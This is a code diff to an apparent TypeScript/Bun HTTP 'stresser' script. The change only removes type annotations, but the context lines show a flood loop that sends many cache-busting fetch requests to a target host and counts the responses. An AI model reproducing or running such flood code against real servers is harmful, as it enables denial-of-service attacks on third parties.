@@ -139,14 +139,14 @@ const run = async (): Promise<void> => {
 
   await Bun.sleep(2500);
 
-  let running: boolean = true;
-  let packets_sent: number = 0;
-  let successful_responses: number = 0;
-  let unsuccessful_responses: number = 0;
-  let remaining_time: number = duration;
+  let running = true;
+  let packets_sent = 0;
+  let successful_responses = 0;
+  let unsuccessful_responses = 0;
+  let remaining_time = duration;
 
   intervals["STRESSING"] = setInterval(() => {
-    for (let i: number = 0; i < ppt; i++) {
+    for (let i = 0; i < ppt; i++) {
       packets_sent++;
 
       fetch(`http://${target}?${Math.random()}=${Math.random()}`, {
@@ -164,10 +164,10 @@ const run = async (): Promise<void> => {
     }
   });
 
-  let previous_packets_sent: number = 0;
-  let previous_successful_responses: number = 0;
-  let previous_unsuccessful_responses: number = 0;
-  let previous_remaining_time: number = 0;
+  let previous_packets_sent = 0;
+  let previous_successful_responses = 0;
+  let previous_unsuccessful_responses = 0;
+  let previous_remaining_time = 0;
 
   setInterval(() => {
     print();
